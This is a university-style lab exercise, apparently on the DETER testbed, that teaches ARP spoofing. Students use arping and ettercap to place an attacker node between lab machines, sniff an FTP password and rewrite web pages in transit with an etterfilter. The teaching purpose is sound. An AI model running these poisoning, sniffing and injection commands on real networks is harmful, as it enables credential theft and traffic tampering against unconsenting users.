<h2>Overview</h2>

This exercise crafts a man-in-the-middle attack by using-- without abusing--
arp. arp is the address resolution protocol. Its design lends itself to the attack. A substantial category of network attacks operate by using protocols per
design, but for different purposes than motivated the design. To make the
attack, no attempt to <i>change</i> the protocol
behavior is needed, only to <i>use</i>  it as-is. This attack, arp spoofing, is in that category. arp is a mechanism designed to let one computer tell another how
to reach it. The mechanism's workings are inherently suitable for one
computer to wrongly tell another to reach <i>it</i>, when the other really wants to
reach some 3rd machine.<p>arp's operation is usually implicit in other network activities, transparent to users. Among other things the arp protocol maintains an
in-memory table of IP-to-ethernet address mappings derived from its operation. There is a related command that's also named arp. Its focus is the table, and it is a tool whereby maintenance of the arp table can be done manually. Another command of interest is arping. It is
for explicitly, manually triggering the arp protocol to action, emitting arp packets.
ettercap is a utility that can use arp to set up a man-in-the-middle attack.<p>This
exercise demonstrates arp spoofing by surfacing normal arp mechanics to view, then using arp as the central component of a
man-in-the-middle attack. Students will observe both the normal, implicit operation
of arp with tshark watching the ping program, and the explicit operation by using the arping utility.
Then they will manipulate arp with ettercap specifically to jockey one computer
into position between two others. The others' conversation then flows through
that computer as a man-in-the-middle. This is without damaging, debasing, or deforming arp
in any way. Arp itself, turned to deliberate usage, is the attack tool.

<span class="anchor" id="setup"></span>
<div class="level3"><h3>Setup</h3>


<p>It is assumed here you already have a DETER account.
Please log in to DETER and "Begin an Experiment," naming it
&quot;arpspoof-<i>xxx</i>&quot; (where <i>  xxx</i> is some suffix like your initials likely to be unique to avoid name conflict with other students' experiments) and loading in <tt>/share/education/MITMARPPoisoning_USC/arpspoof.ns</tt> NS file. When you upload the file, click the checkbox "Do Not Swap
In.&quot; The file produces this internetwork:</p>
<P align="center"><img border="0" src="images/arpspoof-net.jpg" width="404" height="450">
<P>&nbsp;
<P>Examine the file, compare it with the diagram, and note the correspondence.
This is a 2-subnet internetwork with node0 serving as a router that joins the subnets.
The main, lower network is:
<P><b>10.1.1.0 / 255.255.255.248</b>&nbsp; or alternatively&nbsp; <b>10.1.1.0 /
29</b>
<P>Swap your new
experiment in.
<P>You gain a terminal window interface to any of the nodes by &quot;double ssh,&quot;
connecting to users.isi.deterlab.net and from there to the node. For example, to
connect to node1:<P><font size="4" color="#0000FF">ssh&nbsp; &lt;your account name&gt;@users.isi.deterlab.net<br>
ssh&nbsp; node1.arpspoof-xxx.YourProject.isi.deterlab.net</font>

<p>
You need to work on 4 of the nodes (node0 excepted). Open a terminal window to each of them-- nodes 1, 2, 3, and 4. Place them in the quadrants of your screen for easy recognition and access. In each, become user "root" and clean up the screen:
</p>


<font size="4" color="#0000FF">

<p>
sudo su -<br>
cd <br>
clear<br>

</font>

<br>
Here is a brief description of each node's role in this experiment.
</p>

<p><i><u>node0</u></i> - victim, router<br>
<br>
node0 is the router that relays traffic between the two networks. node0 will be one of the victims of man-in-the-middle attacks perpetrated against it and node2 or node3 by node1.
</p>

<p><u><i>node1</i></u> - attacker<br>
<br>
node1 is the ettercap attack platform-- the "man" who will position himself "in the middle" between other nodes (namely 2 and 0). It contains installed copies of ettercap and wireshark. It also holds a script named make-realmappings, to be run before the attack. The script records for reference the real MAC addresses of the various
LAN machines, in a file. So later, you can identify a wrong MAC when you see it. And it holds an ettercap filter file named laughingskull.filter. Ettercap uses such files in order to do dynamic search-and-replace on webpage content. They tell what to search for and what to replace it with.
</p>

<p><u><i>node2</i></u> -victim, web server<br>
<br>
node2 will be one of the victims of the man-in-the-middle attack perpetrated against it and node0 by node1. It is also a secondary web server. node4 is the main web server. We want the attack to cause dynamic replacement of some of node4's webpage content with foreign content
sourced from somewhere else. node2 is "somewhere else."
</p>

<p><i><u>node3</u></i> - victim, web client<br>
<br>
node3 will play web client. While browsing a page on web server node4 some content from node2 instead will incorrectly bleed in, due to node1's behind-the-scenes mischief.  But node3 won't know the difference. This happens because node3 will be one of the victims of the man-in-the-middle attack perpetrated against it and node0 by node1.
</p>

<p><i><u>node4</u></i> - web server, ftp server<br>
<br>
node4 will operate as both a remote web and ftp server. http and ftp traffic to and from it will be the subject of the attack.
The web traffic will be subjected to in-transit alteration, while a password
passing through within the ftp traffic will get fished out. To provide a password
trophy for this purpose, please create a user and give him a password. On node4:
</p>

<p><font size="4" color="#0000FF">
    useradd joe<br>
    usermod -s /bin/bash joe <br>
    sudo mkdir /home/joe <br>
    sudo chown joe:joe /home/joe<br>
passwd joe </font>
&nbsp;&nbsp;&nbsp;&nbsp; (establish a password of your choosing and remember it)<br>
</p>

</ol>

<span class="anchor" id="manipulating"></span>
<h4>1. Manipulating the arp table</h4>
<p>Operate on node1. Examine, populate, and depopulate the arp table. To print the arp table:
<p><font size="4" color="#0000FF">arp&nbsp; -n</font></p>
<p>The table might be empty, especially if you just started your machine or
haven't been using it for a little while. It gets populated with machines' address pairs in the course of machine
interaction. So populating the table calls for a little interaction.
Pinging&nbsp; nearby machines will do. But you can't ping a machine if you don't
already know its address. The nmap utility could automatically ping the entire
range of addresses in your subnet for you. node1's subnet is supposed to be
10.1.1.0/255.255.255.248. Verify:</p>
<p><font size="4" color="#0000FF">ifconfig&nbsp; ethx&nbsp; |&nbsp; grep&nbsp;
&quot;inet addr&quot;</font></p>
To find the correct interface  run &quot;<a href="images/eth-what.jpg">ifconfig
-a</a>&quot; and find the one that possesses the address. If you want to do it
programmatically:</p>
<p><font size="4" color="#0000FF">ifconfig&nbsp; -a&nbsp; |&nbsp; grep&nbsp; -1&nbsp; 10.1.1&nbsp;
|&nbsp; grep&nbsp; eth&nbsp; |&nbsp; gawk&nbsp; '{print $1}'</font></p>
<p>Use the name of
that NIC interface in these instructions wherever I have used ethx, as in the above
command for example.)</p>
<p>The netmask value shown by the command above half-identifies your subnet. Convert it from a dotted
quad (e.g., 255.255.255.0) into a corresponding CIDR bit count (e.g., 24) using
the <a href="http://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing#Prefix_aggregation">rules
of CIDR</a>. To fully identify your subnet, it remains to determine its network
address. Note the IP address for your machine, which was also shown. Determine
your subnet's network address:</p>
<p><font size="4" color="#0000FF">ipcalc&nbsp; -n&nbsp; &lt;your machine's IP
address&gt;&nbsp; &lt;the netmask&gt;</font></p>
<p>Now have nmap ping all the other machines on your subnet (by trying all the
address in the subnet):</p>
<p><font size="4" color="#0000FF">nmap&nbsp; -sP&nbsp; -n&nbsp; --send-ip&nbsp; &lt;subnet network
address&gt;/&lt;CIDR bit count&gt;</font></p>
<p>When this is done, again view the arp table. It should contain some fresh,
further enries:</p>
<p><font size="4" color="#0000FF">arp&nbsp; -n</font></p>
<p>Now that the table has entries, choose one to manually delete (not an
&quot;incomplete&quot; one and <i>absolutely not</i> the &quot;192.168&quot;
one). Note its IP
address. Delete it:</p>
<p><font size="4" color="#0000FF">arp&nbsp; -d&nbsp; &lt;IP address&gt;</font></p>
<p>Re-examine the arp table:</p>
<p><font size="4" color="#0000FF">arp&nbsp; -n</font></p>
<p>If you don't delete an entry manually (you hardly ever do), it will disappear
after a certain timeout period (seconds or minutes by default).</p>


<span class="anchor" id="recording"></span>
<h4>2. Recording actual address mappings</h4>

Address mappings are hard to remember. Spoofing puts false mappings in arp
tables. To grasp what's going on you'll need to be able to differentiate right
from wrong mappings on sight. To record the right ones for future reference,
still on node1, run the
&quot;make-realmappings&quot; srcript:
<p><font size="4" color="#0000FF">~/make-realmappings</font></p>
<p>It deposits the information in file &quot;realmappings.&quot; At any time
during this exercise, view it as a baseline:</p>
<p><font size="4" color="#0000FF">cat&nbsp; realmappings</font></p>
<p>The output should look something like:</p>
<p><font size="2" face="Times New Roman">[dbmnorth@node1 ~]$ cat realmappings<br>
10.1.1.1&nbsp;&nbsp;&nbsp;&nbsp; 00:15:17:57:BF:CE<br>
10.1.1.2&nbsp;&nbsp;&nbsp;&nbsp; 00:15:17:57:C6:BE<br>
10.1.1.3&nbsp;&nbsp;&nbsp;&nbsp; 00:15:17:57:C7:89<br>
10.1.1.6&nbsp;&nbsp;&nbsp;&nbsp; 00:15:17:57:C4:38<br>
[dbmnorth@node1 ~]$</font></p>
<p>Your ethernet addresses will have different values. They will also change across
swap-in's because DETER gives
you different hardware each time.

<span class="anchor" id="triggering"></span>
<h4>3. Triggering arp activity both implicitly and explicitly</h4>

<p>At this point open a second terminal window to node1. In it run tshark as
follows:</p>
<p><font size="4" color="#0000FF">sudo&nbsp; su<br>
tshark -n -i ethx arp or icmp</font></p>
<p>arp packets are usually issued by the network stack during operations, when
needed. They can also be issued by explicit use of the arping command. Identify
the IP address of a computer on your subnet (e.g., 10.1.1.3). Check your arp table and if that
computer appears, delete it. Back in the original node1 terminal window:</p>
<p><font size="4" color="#0000FF">ping&nbsp; -c 1&nbsp; 10.1.1.3</font></p>
<p>Note the arp actvity in the dump. Did you ask for it? Why was it performed?
Now again, for the arp table entry of target computer 10.1.1.3, delete it. Now
in the &quot;command&quot; window:</p>
<p><font size="4" color="#0000FF">arping&nbsp; -c 1&nbsp; -I&nbsp;
ethx&nbsp; 10.1.1.3</font></p>
<p>Note the arp actvity in the dump. Why was it performed? For which of the 2
commands, ping and arping, was the arp activity incidental and for which was it
explicit to the command? Leave tshark running in the dump window.</p>

<span class="anchor" id="manual"></span>
<h4>4. Manual IP spoofing with arping</h4>

arping can compose and send an arp request that represents the machine to
have an arbitrary (e.g., false) IP address. Choose  an IP address within your subnet that is not in actual use
  by any computer (e.g., 10.1.1.5). Run
<p><font size="4" color="#0000FF">
    /sbin/ifconfig ethx:10 10.1.1.5 up
  </font><p>
    This will temporarily assign 10.1.1.5 to ethx as a secondary address on that interface.
While running
tcpdump or wireshark in another terminal:</p>
<p><font size="4" color="#0000FF">arping&nbsp; -c 1&nbsp; -U&nbsp; -I ethx:10&nbsp; 10.1.1.3</font></p>
<p>Observe the outgoing arp request, and in particular the value in its sender
IP field (which IP it claims to come from). It would be interesting to view the arp table on target machine
10.1.1.3, and what impact this command may have had on it. Remotely (and without
great delay)&nbsp; run the
command to do so:</p>

<p><font size="4" color="#0000FF">ssh&nbsp;&nbsp; &lt;your account name&gt;@10.1.1.3&nbsp;&nbsp;
&quot;sudo arp -n"<br>
cat&nbsp; realmappings</font></p>

<p>Note you are using ssh here as a remote command executor. (That's actually
ssh's essential but overlooked purpose. Running it the usual way, for a remote command
session, is really just the special case where the to-be-executed remote command
happens to be a shell.) The arp table output by the above command <i>is not yours</i>. It is that of the other machine.
This way, you can view the
arp tables of linux machines in your subnet on demand without
having to log in to them. Note his arp table contains a mapping for 10.1.1.5. Is
that mapping valid or invalid? 

<p>To our deceived machine (10.1.1.3), arping is able to represent
that the ethernet address of node1 belongs to another IP (10.1.1.5). Once that information is lodged in the deceived
machine's arp table, that machine will send frames wrongly to arping's machine
(10.1.1.1) whenever it wishes to reach the other IP (10.1.1.5). <i>Instead of</i> sending to the
machine that actually holds that IP (if any).&nbsp; That's what &quot;spoofing&quot;
means. I tell you that I'm Joe. Every time you have something to say to Joe you
turn to me and say it unaware that I'm not him.</p>

<p>How does arping get away with this injustice? By following the design
operation of arp. arp intentionally provides that whenever machines get requests
for their <i>own</i> ethernet-to-IP mapping (i.e., when somebody else arps
them), they should then and there record in their table the <i>sender's</i>
mapping. That's always embedded in the incoming arp request. So there are 2 ways
a machine can get another machine's mapping into its table-- actively by asking
for it, or passively as side-effect of being asked. When being asked, the
embedded incoming sender mapping is taken at face value, no questions asked.
Straight into the arp table it goes. Why?? Because arp is smart. It reasons that
the requestor is not requesting idly, but because it is about to initiate
communication which will require responses and so also the sender's mapping.
It's a sure bet his mapping info will be needed so, now that it's in hand, don't
discard it but put it in the table immediately for efficiency. So I can
manipulate your arp table by composing any mapping I want and embedding it as
the sender mapping into an arp request to you. The arping utility is one tool
that can do this for you.</p>

<p>In the &quot;dump&quot; window, terminate tshark (ctrl-C).</p>

<span class="anchor" id="ettercap"></span>
<h4>5. Arp-spoofing your way into the middle of a traffic stream with ettercap</h4>

<p>Ettercap can do the same thing you just did with arping among <i>multiple</i>
nodes in a net. Just as I could do it among multiple people. I could tell you I'm Joe.
And I tell Sally I'm you. Now the both of you will turn to me whenever you want to
talk to each other and say it to me unaware I'm not the other. If I parrot your
stuff on to her, and hers back to you, neither of you will notice anything out
of the ordinary. I would become a man in the middle. Optionally, I could record
all your secrets or insert lies. Ettercap does exactly the
same thing for ethernet frame conversations.</p>
<p>Let's insert node 1 in the middle between node2 and node0 then watch 2 and 0 ping each other. You have two node1 terminal windows open. On node1:</p>
<p><font size="4" color="#0000FF">
ettercap&nbsp; -i ethx -T&nbsp; -M arp&nbsp;
/10.1.1.2//&nbsp;&nbsp; /10.1.1.6//</font></p>
<p>From node1's other terminal window look at the arp tables on both ettercap
target nodes:</p>
<p><font size="4" color="#0000FF">ssh&nbsp;&nbsp; &lt;your account name&gt;@10.1.1.2&nbsp;&nbsp;
&quot;sudo arp -n"<br>
ssh&nbsp;&nbsp; &lt;your account name&gt;@10.1.1.6&nbsp;&nbsp;
&quot;sudo arp -n"<br>
cat&nbsp; realmappings</font></p>
<p>and compare appearance (in those two nodes' eyes) with reality (in
realmappings). Nodes 2 and 0 appear to have a certain hardware address. Whose? On node1 (from 2nd terminal window) run tshark:</p>
<p><font size="4" color="#0000FF"> tshark -c 4 -i ethx icmp</font></p>
<p>Then concurrently on node2:</p>
<p><font size="4" color="#0000FF">ping&nbsp; -c 1&nbsp; 10.1.1.6</font></p>
<p>The above 1-count ping should evoke a single request and corresponding,
single reply between nodes 2 and 0. The tshark trace shows <i>2 of each</i> in
terms of their IP addresses. What's going on? IP addresses are <i>unreliable</i>;
ethernet addresses are <i>fundamental</i>. Find out the real comings and goings
of these 4 frames by rerunning the tshark command as follows:</p>
<p><font size="4" color="#0000FF">tshark -c 4 -i ethx -T fields -e eth.src -e eth.dst -E header=yes icmp</font></p>
<p>Again from node2:</p>
<p><font size="4" color="#0000FF">ping&nbsp; -c 1&nbsp; 10.1.1.6<br>
cat&nbsp; realmappings</font></p>
<p>The trace again shows 4 frames, but in terms of their ethernet addresses this
time. Study the trace with meticulous attention to the addresses and the nodes
they belong to. Follow which node each frame comes from and which it goes to. How does
traffic between node2 and node0 get from node2 to node0?</p>

<span class="anchor" id="sniffing"></span>
<h4>6. Manipulating the traffic stream once you have it - sniffing it</h4>

<p>When something passes through your hands you have it in your hands. So you
can handle it. Or not. By default ettercap does not. It just plays innocent
relay-man much as any router would. But if it decides to intercede, there are
several ways to do it. One possibility is to dynamically read payloads and sniff
out targets such as passwords. Let's have node2 log into node4's ftp server
and have ettercap sniff out the login password.
</p>
<p>In the node1 terminal window running ettercap, terminate it with the
&quot;q&quot; key (note the screen messages). Then run:</p>
<p><font size="4" color="#0000FF">ettercap&nbsp; -i ethx -T&nbsp; -M arp:remote&nbsp;&nbsp;
/10.1.1.2//&nbsp;&nbsp; /10.1.1.6//</font></p>
<p>In the node2 terminal window, while leaving the above node1 window visible on
the display:&nbsp;</p>
<p><font size="4" color="#0000FF">ftp 10.1.2.4</font></p>
<p>and log in as joe with joe's password when prompted. What appears in the
node1 terminal window where ettercap runs? How? (Terminate the ftp client
session-- &quot;quit&quot;.)</p>

<span class="anchor" id="altering"></span>
<h4>7. Manipulating the traffic stream once you have it - altering it</h4>

<p>While the datastream is passing through, another way ettercap can intercede is to actually change it. ettercap can
apply a dynamic search-and-replace. Let node3 browse the node4 web server's default page,
but modify it on the way from node4 to node3, in node1.</p>
<p>Run a web browser on node3. A character mode web browser available on linux
for such diagnostic purposes in lynx. Use it to browse node4. The default web
page on node4 is:</p>
<p><font face="Times New Roman" size="2">&lt;html>&lt;body>&lt;center><br>
<br>
&lt;h1>Congratulations!&lt;/h1><br>
&lt;p>From port 80 here&lt;/p><br>
&lt;img src=congratulations.jpg><br>
<br>
&lt;/center>&lt;/body>&lt;/html></font></p>
<p>On node3:</p>
<p><font size="4" color="#0000FF">lynx&nbsp; http://10.1.2.4</font></p>
<p>It gets the default web page containing its photo of a happy computer &quot;congratulations.jpg.&quot;
In lynx it looks like this:</p>
<p align="center"><img border="0" src="images/lynx-unaltered.jpg" width="587" height="300"></p>
<p>while in a graphical browser it would have this appearance:</p>
<p align="center"><img border="0" src="images/firefox-unaltered.jpg" width="481" height="304"></p>
<p>node2 also runs a web server, and makes available a different image. In the node1 terminal window running ettercap, terminate it with the
&quot;q&quot; key. Then run:</p>
<p><font size="4" color="#0000FF">
etterfilter&nbsp;&nbsp; ~/laughingskull.filter&nbsp;&nbsp;&nbsp; -o ~/laughingskull<br>
</font><font size="4" color="#0000FF">ettercap&nbsp; -i ethx -T&nbsp; -M arp:remote&nbsp;&nbsp;
/10.1.1.3//&nbsp;&nbsp; /10.1.1.6//&nbsp;&nbsp; -F ~/laughingskull</font></p>
<p>Ettercap has a filter capability, with a filter language and the &quot;etterfilter&quot;
compiler for it. Glance at the filter we will use:</p>
<p><font size="4" color="#0000FF">cat&nbsp;&nbsp; ~/laughingskull.filter</font></p>
<p>It expresses:</p>
<p>&nbsp; <b>search for:</b>&nbsp; img src=<br>
&nbsp; <b>replace with:&nbsp;</b> img src=http://10.1.1.2/laughingskull.gif</p>
<p>This inserts the appropriate html to make the page fetch our image, foreign
to the one it's written to fetch. Run the web browser on node3 to browse
node4 again. On node3:</p>
<p><font size="4" color="#0000FF">lynx&nbsp; http://10.1.2.4</font></p>
<p>It gets the default web page containing its photo of a laughing skull &quot;laughingskull.gif.&quot;
In lynx it looks like this:</p>

<p>Ettercap has caused the client browser's received page to differ from the
server's sent one. It did it by 1) datastream diversion to/through itself, and
2) dynamic search and replace on the datastream's in-transit html.</p>

<p>Answer these questions about the above exercise:</p>

1. If node1 is a &quot;man in the middle&quot; then node4 is an &quot;odd man
out.&quot; In particular, node 4 was unaccounted for in section 2 &quot;Recording actual address mappings.&quot;
Later you arp poisoned node2 and node0 from node1; how about arp poisoning node
4 from node1? You accomplish poisoning by sending a crafted arp message to a
node. Comment on the ways and means of poisoning node4 from node1.
<p>2. Answer the question at the end of section 5. Under the circumstances of
that section, &quot;How does
traffic between node2 and node0 get from node2 to node0?&quot;</p>
<p>3. Answer the question at the end of section 6, &quot;How?&quot; That is, recall that
node2 logged into ftp on node4 and somehow node1 figured out the user password
given by node2. How?</p>
<p>4. Imagine you run a web hosting company. The manager at one of your clients,
a medium sized business, calls you in alarm and reports the apparent defacement
of his website running on your host machine. Images on the site have all been
replaced with various hacker images like the laughing skull. He heard about it from
several of his employees, then saw it with his own eyes on their terminals. His
website has fallen victim to the same mischief as the one on our node4. What is
your course of action?
